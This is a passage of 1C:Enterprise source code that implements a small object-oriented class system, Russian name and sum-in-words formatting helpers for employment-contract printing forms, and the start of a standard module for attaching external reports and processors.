Функция Стандартные_ТранспортноеСредство_Представление(Знач ТранспортноеСредство)
	
	Перем Стандартные_ТранспортноеСредство_Представление; // Возвращаемое значение
	
	Стандартные_ТранспортноеСредство_Представление = """" + ТранспортноеСредство.Марка + "", гос. номер "" + ТранспортноеСредство.РегистрационныйЗнак;
	
	Возврат Стандартные_ТранспортноеСредство_Представление;
	
КонецФункции // Стандартные_ТранспортноеСредство_Представление()

// protected
Функция Стандартные_ТранспортноеСредство(Знач ТранспортноеСредство)
	
	ТранспортноеСредство.Вставить(""Марка"", """");
	ТранспортноеСредство.Вставить(""РегистрационныйЗнак"", """");
	
	Возврат ТранспортноеСредство;
	
КонецФункции
Функция Стандартные_ТранспортноеСредство_Include()
	
	Перем Стандартные_Спецификация_Include; // Возвращаемое значение
	
	ООП_ЗарегистрироватьКласс(""Стандартные.ТранспортноеСредство"", ""Структура"");
	
	Возврат Стандартные_Спецификация_Include;
	
КонецФункции // Стандартные_Спецификация_Include
Функция Стандартные_ТранспортноеСредство_Обновить(Знач ТранспортноеСредство)
	
	Перем Стандартные_ТранспортноеСредство_Обновить; // Возвращаемое значение
	
	Перем ЕстьФамилия;
	Перем ЕстьИмя;
	Перем ЕстьОтчество;
	
	Стандартные_ТранспортноеСредство_Обновить = Истина;
	
	ЕстьФамилия    = НЕ (0 = СтрДлина(ТранспортноеСредство.Фамилия));
	ЕстьИмя       = НЕ (0 = СтрДлина(ТранспортноеСредство.Имя));
	ЕстьОтчество  = НЕ (0 = СтрДлина(ТранспортноеСредство.Отчество));
	
	ТранспортноеСредство.ФамилияИО =    """"
	+ ?(ЕстьФамилия, ТранспортноеСредство.Фамилия, """")
	+ ?(ЕстьИмя, ?(ЕстьФамилия, "" "", """") + Лев(ТранспортноеСредство.Имя, 1) + ""."", """")
	+ ?(ЕстьОтчество, ?(ЕстьИмя, """", ?(ЕстьФамилия, "" "", """")) + Лев(ТранспортноеСредство.Отчество, 1) + ""."", """")
	; 
	
	ТранспортноеСредство.ИОФамилия = """"
	+ ?(ЕстьИмя, Лев(ТранспортноеСредство.Имя, 1) + ""."", """")
	+ ?(ЕстьОтчество, Лев(ТранспортноеСредство.Отчество, 1) + ""."", """")
	+ ?(ЕстьФамилия, ?(ЕстьФамилия ИЛИ ЕстьОтчество, "" "", """") + ТранспортноеСредство.Фамилия, """")
	; 
	
	ТранспортноеСредство.ФамилияИмяОтчество = """"
	+ ?(ЕстьФамилия, ТранспортноеСредство.Фамилия, """")
	+ ?(ЕстьИмя, ?(ЕстьФамилия, "" "", """") + ТранспортноеСредство.Имя, """")
	+ ?(ЕстьОтчество, ?(ЕстьФамилия ИЛИ ЕстьИмя, "" "", """") + ТранспортноеСредство.Отчество, """")
	; 
	
	Возврат Стандартные_ТранспортноеСредство_Обновить;
	
КонецФункции

#КонецОбласти //class_Стандартные_ТранспортноеСредство//

// Соответствия
#Область class_Стандартные_Адреса

// protected
Функция Стандартные_Адреса(Знач Стандартные_Адреса)
	
	Стандартные_Адреса.Вставить(""Юридический"",  ООП_Новый(""Стандартные.Адрес""));
	//Стандартные_Адреса.Вставить(""Фактический"",  ООП_Новый(""Стандартные.Адрес""));
	Стандартные_Адреса.Вставить(""Почтовый"",     ООП_Новый(""Стандартные.Адрес""));
	//Стандартные_Адреса.Вставить(""Регистрации"",  ООП_Новый(""Стандартные.Адрес""));
	
	Возврат Стандартные_Адреса;
	
КонецФункции
Функция Стандартные_Адреса_Include()
	
	Перем Стандартные_Адреса_Include; // Возвращаемое значение
	
	ООП_include(""Стандартные.Адрес"");
	
	ООП_ЗарегистрироватьКласс(""Стандартные.Адреса"", ""Соответствие"");
	
	Возврат Стандартные_Адреса_Include;
	
КонецФункции // Стандартные_Адреса_Include

#КонецОбласти //class_Стандартные_Адреса//
#Область class_Стандартные_НаименованияЮрФизЛица

// protected
Функция Стандартные_НаименованияЮрФизЛица(Знач Стандартные_НаименованияЮрФизЛица)
	
	Стандартные_НаименованияЮрФизЛица.Вставить(""Полное"", """");
	Стандартные_НаименованияЮрФизЛица.Вставить(""Сокращенное"", """");
	Стандартные_НаименованияЮрФизЛица.Вставить(""Краткое"", """");
	
	Возврат Стандартные_НаименованияЮрФизЛица;
	
КонецФункции
Функция Стандартные_НаименованияЮрФизЛица_Include()
	
	Перем Стандартные_НаименованияЮрФизЛица_Include; // Возвращаемое значение
	
	ООП_ЗарегистрироватьКласс(""Стандартные.НаименованияЮрФизЛица"", ""Соответствие"");
	
	Возврат Стандартные_НаименованияЮрФизЛица_Include;
	
КонецФункции // Стандартные_НаименованияЮрФизЛица_Include

#КонецОбласти //class_Стандартные_НаименованияЮрФизЛица//
#Область class_Стандартные_ФизическиеЛица

// protected
Функция Стандартные_ФизическиеЛица(Знач Стандартные_ФизическиеЛица)
	
	Возврат Стандартные_ФизическиеЛица;
	
КонецФункции
Функция Стандартные_ФизическиеЛица_Include()
	
	Перем Стандартные_ФизическиеЛица_Include; // Возвращаемое значение
	
	ООП_include(""Стандартные.ФизическоеЛицо"");
	
	ООП_ЗарегистрироватьКласс(""Стандартные.ФизическиеЛица"", ""Соответствие"");
	
	Возврат Стандартные_ФизическиеЛица_Include;
	
КонецФункции // Стандартные_ФизическиеЛица_Include

#КонецОбласти //class_Стандартные_ФизическиеЛица//

#КонецОбласти //namespace_Стандартные//
#Область namespace_ООП

Функция ООП_Новый(Знач classname) Экспорт
	
	Перем ООП_Новый;
	
	ООП_Новый = ООП_new(classname);
	Возврат ООП_Новый;
	
КонецФункции	
Функция ООП_new(val classname)
	
	var ООП_new;
	
	if( Undefined = classname ) then
		return Undefined;		
	endif;
	
	ООП_validateclassname(classname);
	
	// Создадим объект соответствующего типа
	
	code = ""ООП_new = new "" + ООП_Classes[classname].type + "";"";
	execute(code);
	
	ООП_ClassInstances.Insert(ООП_new, new structure(""classname"", classname));
	
	ООП_new = ООП_constructor(ООП_new, classname);
	
	return ООП_new;
	
КонецФункции	
Функция ООП_validateclassname(Знач classname)
	
	Перем ООП_validateclassname; // Возвращаемое значение
	
	Если ( Неопределено = ООП_Classes[classname] ) Тогда
		ВызватьИсключение ""Неизвестный класс """""" + classname + """""""";	
	КонецЕсли; 
	
	Возврат ООП_validateclassname;
	
КонецФункции // ООП_validateclassname
Функция ООП_validateobject(Знач object)
	
	Перем ООП_validateobject; // Возвращаемое значение
	
	Если ( Неопределено = ООП_ClassInstances[object] ) Тогда
		ВызватьИсключение ""Объект """""" + Строка(object) + """""" незарегистрирован"";	
	КонецЕсли;
	
	Возврат ООП_validateobject;
	
КонецФункции // ООП_validateobject
Function ООП_validateclasshierarchy(val childclassname, val baseclassname)

	var ООП_validateclasshierarchy; // Return value
	var classname;
	
	classname = childclassname;
	while( true ) do
		
		if( baseclassname = classname ) then
			return true;
		endif;
		
		classname = ООП_Classes[classname].parentclassname;
		if( undefined = classname ) then
			break;
		endif
		
	enddo; 
	
	raise ""Класс """""" + childclassname + """""" не является потомком класса """""" + baseclassname+ """"""."";
	
	return ООП_validateclasshierarchy;

EndFunction // ООП_ischild() 
Функция ООП_ЗарегистрироватьКласс(classname, type, parentclassname = Неопределено)
	
	Перем ООП_ЗарегистрироватьКласс;
	
	Если ( Неопределено <> ООП_Classes.Получить(classname) ) Тогда
		ВызватьИсключение ""Объект с именем """""" + classname + """""" уже зарегистрирован."";
	Иначе
		ООП_Classes.Вставить(classname, Новый Структура(""classname, type, parentclassname"", classname, type, parentclassname));
	КонецЕсли; 
	
	Возврат ООП_ЗарегистрироватьКласс;
	
КонецФункции
Функция ООП_ДеревоКлассов(Знач classname);
	ВызватьИсключение ""Метод не реализован"";
	Возврат Неопределено;
КонецФункции
Функция ООП_include(Знач classname)
	
	Перем ООП_Include;
	
	Если ( Неопределено = ООП_Classes.Получить(classname) ) Тогда
		
		Код = ""ООП_Include = "" + ООП_ИмяКласса1С(classname) + ""_Include()"";
		Выполнить(Код);
		
	КонецЕсли;
	
	Возврат ООП_Include;
	
КонецФункции
function ООП_method(val object, val classname, val methodname = Undefined, val params = Undefined)

	var ООП_method; // Return value
	var index, paramsstring;
	
	paramsstring = ""object"";
	
	if( Undefined <> params ) then
		
		if( Type(""array"") <> TypeOf(params) ) then
			raise ""Неверный тип параметра params"";	
		endif;
		
		for index = 0 To params.UBound() do
			paramsstring = paramsstring + "", params["" + index + ""]"";
		enddo; 
		
	endif;
	
	code = ""ООП_method = ""
	+ СтрЗаменить(classname, ""."", ""_"") + ?(Undefined = methodname, """", ""_"" + methodname)
	+ ""("" + paramsstring + "")"";
	Execute(code);
	
	return ООП_method;

endfunction // ООП_method()
Функция ООП_constructor(Знач object, Знач classname)
	
	Перем ООП_constructor; // Возвращаемое значение
	
	Код = ""ООП_constructor = "" + СтрЗаменить(classname, ""."", ""_"") + ""(object)"";
	Выполнить(Код);
	
	Возврат ООП_constructor;
	
КонецФункции // ООП_constructor
Функция ООП_parent(val object, val baseclassname = undefined, val methodname = Undefined, val params = Undefined)
	// TODO: расширить возможность использования не только в конструкторе
	
	var ООП_parent;
	var classname, parentclassname;
	
	ООП_validateobject(object);
	
	classname = ООП_ClassInstances[object].classname;
	ООП_validateclassname(classname);
	if( undefined = baseclassname ) then
		baseclassname = classname;
	else
		ООП_validateclassname(baseclassname);
	endif;
	ООП_validateclasshierarchy(classname, baseclassname);
	
	parentclassname = ООП_Classes[baseclassname].parentclassname;
	if( Undefined = parentclassname ) then
		return Undefined;
	endif; 
	ООП_validateclassname(parentclassname);
	
	if( ТипЗнч(object) <> Тип(ООП_Classes[parentclassname].type) ) then
		raise ""Вызов конструктора несовместимого типа"";
	endif;
	
	ООП_method(object, parentclassname, methodname, params);
	
	return ООП_parent;
	
КонецФункции
Функция ООП_ИмяКласса1С(Знач classname)
	
	Перем ООП_ИмяКласса1С; // Возвращаемое значение
	
	ООП_ИмяКласса1С = СтрЗаменить(classname, ""."", ""_"");
	
	Возврат ООП_ИмяКласса1С;
	
КонецФункции // ООП_ИмяКласса1С

#КонецОбласти //namespace_ООП//
#Область СлужебныеПроцедурыИФункции

#Область СлужебныеПроцедурыИФункции_ОбщегоНазначения

Функция ЕстьЦифры(СтрокаПроверки)
	
	Для НомерСимвола = 1 По СтрДлина(СтрокаПроверки) Цикл
		КодСимвола = КодСимвола(СтрокаПроверки, НомерСимвола);
		Если КодСимвола >= 48 И КодСимвола <= 57 Тогда
			Возврат Истина;
		КонецЕсли; 		
	КонецЦикла; 
	
	Возврат Ложь;
	
КонецФункции
Функция ОтветственныеЛица(Организация, ДатаСреза, Подразделение = Неопределено)
	
	Перем ОтветственныеЛица;
	
	Если (Истина) Тогда // Для arautomation.1_1
		ОтветственныеЛица = ОбщегоНазначения.ОтветственныеЛица(Организация, ДатаСреза, Подразделение);
	КонецЕсли; 
	Если (Ложь) Тогда
		//Если (Истина) Тогда
		//
		//СобиратьПоОрганизации = Истина;
		//ОтветственныеЛица = Новый Структура(""Руководитель, РуководительДолжность, РуководительФИО, РуководительПредставление, 
		//|ГлавныйБухгалтер, ГлавныйБухгалтерДолжность, ГлавныйБухгалтерФИО, ГлавныйБухгалтерПредставление, 
		//|Кассир, КассирДолжность, КассирФИО, КассирПредставление,  
		//|ОтветственныйЗаРегистры, ОтветственныйЗаРегистрыДолжность, ОтветственныйЗаРегистрыФИО, ОтветственныйЗаРегистрыПредставление"");
		//
		//Если Организация <> Неопределено тогда
		//	
		//	ЗапросПоЛицам = Новый Запрос();
		//	ЗапросПоЛицам.УстановитьПараметр(""ДатаСреза"",   ДатаСреза);
		//	ЗапросПоЛицам.УстановитьПараметр(""Организация"", Организация);
		//	ЗапросПоЛицам.УстановитьПараметр(""ПризнакФизЛица"",   Перечисления.ЮрФизЛицо.ФизЛицо);
		//	
		//	ЗапросПоЛицам.Текст = ""ВЫБРАТЬ
		//	|   ФИОФизЛицСрезПоследних.Фамилия,
		//	|   ФИОФизЛицСрезПоследних.Имя,
		//	|   ФИОФизЛицСрезПоследних.Отчество,
		//	|   ФИОФизЛицСрезПоследних.ФизЛицо КАК ФизическоеЛицо
		//	|ИЗ
		//	|   РегистрСведений.ФИОФизЛиц.СрезПоследних(&ДатаСреза, ) КАК ФИОФизЛицСрезПоследних
		//	|       ВНУТРЕННЕЕ СОЕДИНЕНИЕ Справочник.Организации КАК Организации
		//	|       ПО ФИОФизЛицСрезПоследних.ФизЛицо = Организации.ИндивидуальныйПредприниматель
		//	|           И (Организации.Ссылка = &Организация)
		//	|           И (Организации.ЮрФизЛицо = &ПризнакФизЛица)"";
		//	
		//	Руководители = ЗапросПоЛицам.Выполнить().Выбрать();
		//	
		//	Пока Руководители.Следующий() Цикл
		//		
		//		ФИО = Новый Структура(""Фамилия, Имя, Отчество, Представление"");
		//		Если НЕ (НЕ ЗначениеЗаполнено(Руководители.Фамилия) или Руководители.Фамилия = NULL) Тогда
		//			ФИО.Фамилия = Руководители.Фамилия;
		//		КонецЕсли;
		//		Если НЕ (НЕ ЗначениеЗаполнено(Руководители.Имя) или Руководители.Имя = NULL) Тогда
		//			ФИО.Имя = Руководители.Имя;
		//		КонецЕсли;
		//		Если НЕ (НЕ ЗначениеЗаполнено(Руководители.Отчество) или Руководители.Отчество = NULL) Тогда
		//			ФИО.Отчество = Руководители.Отчество;
		//		КонецЕсли;
		//		//Представление = ОбщегоНазначения.ПолучитьФамилиюИмяОтчество(ФИО.Фамилия, ФИО.Имя, ФИО.Отчество);
		//		Представление = ПолучитьФамилиюИмяОтчество(ФИО.Фамилия, ФИО.Имя, ФИО.Отчество);
		//		
		//		ОтветственныеЛица.Руководитель               = Руководители.ФизическоеЛицо;
		//		ОтветственныеЛица.РуководительДолжность      = """";
		//		ОтветственныеЛица.РуководительФИО            = ФИО;
		//		ОтветственныеЛица.РуководительПредставление  = Представление;
		//		
		//	КонецЦикла;
		//	
		//	Если СобиратьПоОрганизации Тогда
		//		
		//		ЗапросПоЛицам.Текст = 
		//		""ВЫБРАТЬ
		//		|   ОтветственныеЛицаОрганизацийСрезПоследних.ОтветственноеЛицо,
		//		|   ОтветственныеЛицаОрганизацийСрезПоследних.ФизическоеЛицо,
		//		|   ОтветственныеЛицаОрганизацийСрезПоследних.Должность,
		//		|   ФИОФизЛицСрезПоследних.Фамилия,
		//		|   ФИОФизЛицСрезПоследних.Имя,
		//		|   ФИОФизЛицСрезПоследних.Отчество
		//		|ИЗ
		//		|   РегистрСведений.ОтветственныеЛицаОрганизаций.СрезПоследних(&ДатаСреза, СтруктурнаяЕдиница = &Организация) КАК ОтветственныеЛицаОрганизацийСрезПоследних
		//		|       ЛЕВОЕ СОЕДИНЕНИЕ РегистрСведений.ФИОФизЛиц.СрезПоследних(&ДатаСреза, ФизЛицо ССЫЛКА Справочник.ФизическиеЛица) КАК ФИОФизЛицСрезПоследних
		//		|       ПО ОтветственныеЛицаОрганизацийСрезПоследних.ФизическоеЛицо = ФИОФизЛицСрезПоследних.ФизЛицо"";
		//		Руководители = ЗапросПоЛицам.Выполнить().Выбрать();
		//	КонецЕсли;
		//	
		//	Пока Руководители.Следующий() Цикл
		//		
		//		ФИО = Новый Структура(""Фамилия, Имя, Отчество, Представление"");
		//		Если НЕ (НЕ ЗначениеЗаполнено(Руководители.Фамилия) или Руководители.Фамилия = NULL) Тогда
		//			ФИО.Фамилия = Руководители.Фамилия;
		//		КонецЕсли;
		//		Если НЕ (НЕ ЗначениеЗаполнено(Руководители.Имя) или Руководители.Имя = NULL) Тогда
		//			ФИО.Имя = Руководители.Имя;
		//		КонецЕсли;
		//		Если НЕ (НЕ ЗначениеЗаполнено(Руководители.Отчество) или Руководители.Отчество = NULL) Тогда
		//			ФИО.Отчество = Руководители.Отчество;
		//		КонецЕсли;
		//		//Представление = ОбщегоНазначения.ПолучитьФамилиюИмяОтчество(ФИО.Фамилия, ФИО.Имя, ФИО.Отчество);
		//		Представление = ПолучитьФамилиюИмяОтчество(ФИО.Фамилия, ФИО.Имя, ФИО.Отчество);
		//		
		//		Если Руководители.ОтветственноеЛицо      = Перечисления.ОтветственныеЛицаОрганизаций.Руководитель Тогда
		//			ОтветственныеЛица.Руководитель               = Руководители.ФизическоеЛицо;
		//			ОтветственныеЛица.РуководительДолжность      = Руководители.Должность;
		//			ОтветственныеЛица.РуководительФИО            = ФИО;
		//			ОтветственныеЛица.РуководительПредставление  = Представление;
		//			
		//		ИначеЕсли Руководители.ОтветственноеЛицо = Перечисления.ОтветственныеЛицаОрганизаций.ГлавныйБухгалтер Тогда
		//			ОтветственныеЛица.ГлавныйБухгалтер           = Руководители.ФизическоеЛицо;
		//			ОтветственныеЛица.ГлавныйБухгалтерДолжность  = Руководители.Должность;
		//			ОтветственныеЛица.ГлавныйБухгалтерФИО        = ФИО;
		//			ОтветственныеЛица.ГлавныйБухгалтерПредставление  = Представление;
		//			
		//		ИначеЕсли Руководители.ОтветственноеЛицо = Перечисления.ОтветственныеЛицаОрганизаций.Кассир Тогда
		//			ОтветственныеЛица.Кассир                     = Руководители.ФизическоеЛицо;
		//			ОтветственныеЛица.КассирДолжность            = Руководители.Должность;
		//			ОтветственныеЛица.КассирФИО                  = ФИО;
		//			ОтветственныеЛица.КассирПредставление  = Представление;
		//			
		//		ИначеЕсли Руководители.ОтветственноеЛицо = Перечисления.ОтветственныеЛицаОрганизаций.ОтветственныйЗаНалоговыеРегистры Тогда
		//			ОтветственныеЛица.ОтветственныйЗаРегистры    = Руководители.ФизическоеЛицо;
		//			ОтветственныеЛица.ОтветственныйЗаРегистрыДолжность      = Руководители.Должность;
		//			ОтветственныеЛица.ОтветственныйЗаРегистрыФИО = ФИО;
		//			ОтветственныеЛица.ОтветственныйЗаРегистрыПредставление  = Представление;
		//			
		//		КонецЕсли;
		//		
		//	КонецЦикла;
		//	
		//КонецЕсли; 
		//	
		//КонецЕсли;
	КонецЕсли;
	
	Возврат ОтветственныеЛица;

КонецФункции
Функция ПросклонятьФразу(Знач Фраза, Знач Падеж, Знач Пол)
	
	Перем ПодстрокаВПадеже;
	
	МассивПодстрок = РазложитьСтрокуВМассивПодстрок(Фраза, "" "");
	
	Результат = """";
	Для каждого Подстрока Из МассивПодстрок Цикл
		
		ПодстрокаВПадеже = """";
		Если Найти(Подстрока, ""."") > 0 ИЛИ ЕстьЦифры(Подстрока) Тогда
			ПодстрокаВПадеже = Подстрока;
		Иначе 
			ОбщегоНазначения.Просклонять(Подстрока, Падеж, ПодстрокаВПадеже, Пол)
			//УниверсальныеМеханизмы.Просклонять(глЗначениеПеременной(""глКомпонентаСклоненияФИО""), Подстрока, Падеж, Пол, ПодстрокаВПадеже); // hrmcorp.2.5
		КонецЕсли; 
		
		Результат = Результат + "" "" + ПодстрокаВПадеже;
		
	КонецЦикла;
	
	Возврат СокрЛП(Результат);
КонецФункции
Функция ПолучитьМакетПараметрыМассивИмен(ОбластьТабДокумента)
	МакетПараметрыМассивИмен = Новый Массив;
	Для НомерСтроки = 1 По ОбластьТабДокумента.ВысотаТаблицы Цикл
		Для НомерКолонки = 1 По ОбластьТабДокумента.ШиринаТаблицы Цикл
			Ячейка = ОбластьТабДокумента.Область(НомерСтроки, НомерКолонки, НомерСтроки, НомерКолонки);
			Если Ячейка.Заполнение = ТипЗаполненияОбластиТабличногоДокумента.Параметр Тогда
				//если такого параметра еще нет, то добавим его
				
				Если МакетПараметрыМассивИмен.Найти(Ячейка.Параметр) = Неопределено тогда
					МакетПараметрыМассивИмен.Добавить(Ячейка.Параметр);
				КонецЕсли;
			ИначеЕсли Ячейка.Заполнение = ТипЗаполненияОбластиТабличногоДокумента.Шаблон Тогда
				//выделим все параметры в шаблоне в отдельные строки
				
				ТекстШаблона = Ячейка.Текст;
				ТекстШаблона = СтрЗаменить(ТекстШаблона, ""["", Символы.ПС + ""["");
				ТекстШаблона = СтрЗаменить(ТекстШаблона, ""]"", Символы.ПС);
				Для Счетчик = 1 По СтрЧислоСтрок(ТекстШаблона) Цикл
					ТекСтрока = СтрПолучитьСтроку(ТекстШаблона, Счетчик);
					Если Лев(ТекСтрока, 1) = ""["" тогда
						ИмяПараметра = Сред(ТекСтрока, 2);
						//если такого параметра еще нет, то добавим его
						
						Если МакетПараметрыМассивИмен.Найти(ИмяПараметра) = Неопределено тогда
							МакетПараметрыМассивИмен.Добавить(ИмяПараметра);
						КонецЕсли;
					КонецЕсли;
				КонецЦикла; 
			КонецЕсли;//конец проверки, что в ячейке - текст, параметр или шаблон
			
		КонецЦикла;//конец обхода по колонкам
		
	КонецЦикла;//конец обхода по строкам
	
	Возврат МакетПараметрыМассивИмен;
КонецФункции	

#Область РаботаСоСтроками

Функция ДокументУдостоверяющийЛичностьВСтроку(ДокументУдостоверяющийЛичность)
	Возврат """"
	+ """"          + ДокументУдостоверяющийЛичность.Вид + "",""
	+ "" серия ""   + ДокументУдостоверяющийЛичность.Серия
	+ "" № ""       + ДокументУдостоверяющийЛичность.Номер + "",""
	+ "" выданный "" + Формат(ДокументУдостоверяющийЛичность.ДатаВыдачи, ""ДФ=dd.MM.yyyy"")
	+ "" ""         + ДокументУдостоверяющийЛичность.КемВыдан;
КонецФункции
Функция ПредметИсчисленияПрописью(Знач Число, Знач Валюта, Знач ФорматЧисла = """")
	Перем Результат;
	
	Если ПустаяСтрока(ФорматЧисла) Тогда
		Результат = """";
	Иначе
		Результат = Формат(Число, ""ЧН=0"" + ФорматЧисла) + "" "";
	КонецЕсли;
	
	Если Тип(""Строка"") = ТипЗнч(Валюта) Тогда
		ПараметрыПредметаИсчисления = Валюта;
	Иначе
		ПараметрыПредметаИсчисления = Валюта.ПараметрыПрописиНаРусском;
	КонецЕсли; 
	
	МассивПредставлений = Новый Массив;
	
	Позиция = Найти(ПараметрыПредметаИсчисления, "","");
	Пока Позиция > 0 Цикл
		Значение = СокрЛП(Лев(ПараметрыПредметаИсчисления, Позиция-1));
		ПараметрыПредметаИсчисления = Сред(ПараметрыПредметаИсчисления, Позиция + 1);
		МассивПредставлений.Добавить(Значение);
		Позиция = Найти(ПараметрыПредметаИсчисления, "","");
	КонецЦикла;
	
	Если СтрДлина(ПараметрыПредметаИсчисления) > 0 Тогда
		Значение = СокрЛП(ПараметрыПредметаИсчисления);
		МассивПредставлений.Добавить(Значение);
	КонецЕсли;	
	
	Если Число >= 100 Тогда
		Число = Число - Цел(Число / 100)*100;
	КонецЕсли;
	
	Если Число > 20 Тогда
		Число = Число - Цел(Число/10)*10;
	КонецЕсли;
	
	Если Число = 1 Тогда
		Результат = Результат + МассивПредставлений[0];
	ИначеЕсли Число > 1 и Число < 5 Тогда
		Результат = Результат + МассивПредставлений[1];
	Иначе
		Результат = Результат + МассивПредставлений[2];
	КонецЕсли;
	
	Возврат Результат;	
	
КонецФункции
Функция РазложитьСтрокуВМассивПодстрок(Знач Стр, Разделитель = "","") Экспорт
	
	Возврат СтроковыеФункцииКлиентСервер.РазложитьСтрокуВМассивПодстрок(Стр, Разделитель);
	
КонецФункции // глРазложить

#КонецОбласти //РаботаСоСтроками//
#Область ФорматированиеСумм

// Функция формирует представление суммы прописью в указанной валюте
//
// Возвращаемое значение:
//  Строка - сумма прописью
//
Функция СформироватьСуммуПрописью(Сумма, Валюта) Экспорт
	
	Если Тип(""Строка"") = ТипЗнч(Валюта) Тогда
		ПараметрыПрописиВалюты = Валюта;
	Иначе
		ПараметрыПрописиВалюты = Валюта.ПараметрыПрописиНаРусском;
	КонецЕсли; 
	
	Если """" = ПараметрыПрописиВалюты Тогда
		Возврат ФорматСумм(Сумма);
	Иначе
		Возврат ЧислоПрописью(Сумма, ""L=ru_RU"", ПараметрыПрописиВалюты);
	КонецЕсли;
	
КонецФункции // СформироватьСуммуПрописью()

// Стандартная для данной конфигурации функция форматирования сумм
//
// Параметры: 
//  Сумма  - число, которое мы хотим форматировать, 
//  Валюта - ссылка на элемент справочника валют, если задан, то к в результирующую строку
//           будет добавлено представление валюты
//  ЧН     - строка, представляющая нулевое значение числа,
//  ЧРГ    - символ-разделитель групп целой части числа.
//
// Возвращаемое значение:
//  Отформатированная должным образом строковое представление суммы.
//
Функция ФорматСумм(Сумма, Валюта = Неопределено, ЧН = """", ЧРГ = """") Экспорт
	
	ФорматнаяСтрока = ""ЧЦ=15;ЧДЦ=2"" +
	?(ПустаяСтрока(ЧН), """", "";"" + ""ЧН="" + ЧН) +
	?(ПустаяСтрока(ЧРГ),"""", "";"" + ""ЧРГ="" + ЧРГ);
	РезультирующаяСтрока = СокрЛ(Формат(Сумма, ФорматнаяСтрока));
	
	Если Валюта <> Неопределено Тогда
		РезультирующаяСтрока = РезультирующаяСтрока + "" "" + СокрП(Валюта);
	КонецЕсли;
	
	Возврат РезультирующаяСтрока;
	
КонецФункции // ФорматСумм()

Функция ФорматСуммаПредметИсчисленияПрописью(Знач Сумма, Знач Валюта = Неопределено)
	Возврат
	ФорматСумм(Сумма, , ""0"") + "" "" + ПредметИсчисленияПрописью(Сумма, Валюта);
КонецФункции

Функция ФорматСуммаПредметИсчисленияПрописьюСуммаПрописью(Знач Сумма, Знач Валюта = Неопределено)
	Возврат
	ФорматСуммаПредметИсчисленияПрописью(Сумма, Валюта) + "" ("" + СформироватьСуммуПрописью(Сумма, Валюта) + "")"";
КонецФункции

#КонецОбласти //ФорматированиеСумм//

#КонецОбласти //СлужебныеПроцедурыИФункции_ОбщегоНазначения//

#КонецОбласти //СлужебныеПроцедурыИФункции//
#Область ОбластьОсновнойПрограммы

мДлинаЗемныхСуток = 24*60*60;

#Область ОбластьОсновнойПрограммы_ООП

ООП_Classes = new Map;
ООП_ClassInstances = new Map;

#КонецОбласти //ОбластьОсновнойПрограммы_ООП//

//ООП_Include(""ДополнительныеОтчетыИОбработки.СведенияОВнешнейОбработке"");
//ООП_Include(""ДополнительныеОтчетыИОбработки.КомандыПоставляемыеОбработкой"");
ООП_include(""МакетыИДанные"");
ООП_include(""Документ_ПриемНаРаботу"");
ООП_include(""ПФ_MXL_ТрудовойДоговорИТРВахтаРКС"");
ООП_include(""ПФ_MXL_ТрудовойДоговорИТРОсновнойГрафикРКС"");
ООП_include(""ПФ_MXL_ТрудовойДоговорИТРСовместительствоРКС"");
ООП_include(""ПФ_MXL_ТрудовойДоговорРабочиеВахтаРКС"");
ООП_include(""ПФ_MXL_ТрудовойДоговорРабочиеОсновнойГрафикРКС"");
ООП_include(""ПФ_MXL_ТрудовойДоговорСдельныеРасценки"");
ООП_include(""ПФ_MXL_ТрудовойДоговорВредники"");
ООП_include(""ПФ_MXL_ТрудовойДоговорВредникиЛьготники"");
#КонецОбласти //ОбластьОсновнойПрограммы//
"}
},
{0,
{"ДополнительныеОтчетыИОбработки Модуль Типовое",0,0,"","#Область ПрограммныйИнтерфейс

// Подключает и возвращает имя, под которым подключен внешний отчет или обработка.
// После подключения отчет или обработка регистрируется в программе под определенным именем,
// используя которое можно создавать объект или открывать формы отчета или обработки.
//
// Важно: проверка функциональной опции ""ИспользоватьДополнительныеОтчетыИОбработки""
// должна выполняться вызывающим кодом.
//
// Параметры:
//   Ссылка - СправочникСсылка.ДополнительныеОтчетыИОбработки - Подключаемая обработка.
//
// Возвращаемое значение: 
//   * Строка       - Имя подключенного отчета или обработки.
//   * Неопределено - Если передана некорректная ссылка.
//
Функция ПодключитьВнешнююОбработку(Ссылка) Экспорт
	
	СтандартнаяОбработка = Истина;
	Результат = Неопределено;
	
	ИнтеграцияСТехнологиейСервиса.ПриПодключенииВнешнейОбработки(Ссылка, СтандартнаяОбработка, Результат);
	Если Не СтандартнаяОбработка Тогда
		Возврат Результат;
	КонецЕсли;
		
	// Проверка корректности переданных параметров.
	Если ТипЗнч(Ссылка) <> Тип(""СправочникСсылка.ДополнительныеОтчетыИОбработки"") 
		Или Ссылка = Справочники.ДополнительныеОтчетыИОбработки.ПустаяСсылка() Тогда
		Возврат Неопределено;
	КонецЕсли;
	
	// Подключение
	#Если ТолстыйКлиентОбычноеПриложение Тогда
		ИмяОбработки = ПолучитьИмяВременногоФайла();
		ХранилищеОбработки = ОбщегоНазначения.ЗначениеРеквизитаОбъекта(Ссылка, ""ХранилищеОбработки"");
		ДвоичныеДанные = ХранилищеОбработки.Получить();
		ДвоичныеДанные.Записать(ИмяОбработки);
		Возврат ИмяОбработки;
	#КонецЕсли
	
	Вид = ОбщегоНазначения.ЗначениеРеквизитаОбъекта(Ссылка, ""Вид"");
	Если Вид = Перечисления.ВидыДополнительныхОтчетовИОбработок.Отчет
		Или Вид = Перечисления.ВидыДополнительныхОтчетовИОбработок.ДополнительныйОтчет Тогда
		Менеджер = ВнешниеОтчеты;
	Иначе
		Менеджер = ВнешниеОбработки;
	КонецЕсли;
	
	ПараметрыЗапуска = ОбщегоНазначения.ЗначенияРеквизитовОбъекта(Ссылка, ""БезопасныйРежим, ХранилищеОбработки"");
	АдресВоВременномХранилище = ПоместитьВоВременноеХранилище(ПараметрыЗапуска.ХранилищеОбработки.Получить());
	
	Если ОбщегоНазначения.ПодсистемаСуществует(""СтандартныеПодсистемы.ПрофилиБезопасности"") Тогда
		МодульРаботаВБезопасномРежиме = ОбщегоНазначения.ОбщийМодуль(""РаботаВБезопасномРежиме"");
		ИспользуютсяПрофилиБезопасности = МодульРаботаВБезопасномРежиме.ИспользуютсяПрофилиБезопасности();
	Иначе
		ИспользуютсяПрофилиБезопасности = Ложь;
	КонецЕсли;
	
	Если ИспользуютсяПрофилиБезопасности Тогда
		
		МодульРаботаВБезопасномРежимеСлужебный = ОбщегоНазначения.ОбщийМодуль(""РаботаВБезопасномРежимеСлужебный"");
		БезопасныйРежим = МодульРаботаВБезопасномРежимеСлужебный.РежимПодключенияВнешнегоМодуля(Ссылка);
		
		Если БезопасныйРежим = Неопределено Тогда
			БезопасныйРежим = Истина;
		КонецЕсли;
		
	Иначе
		
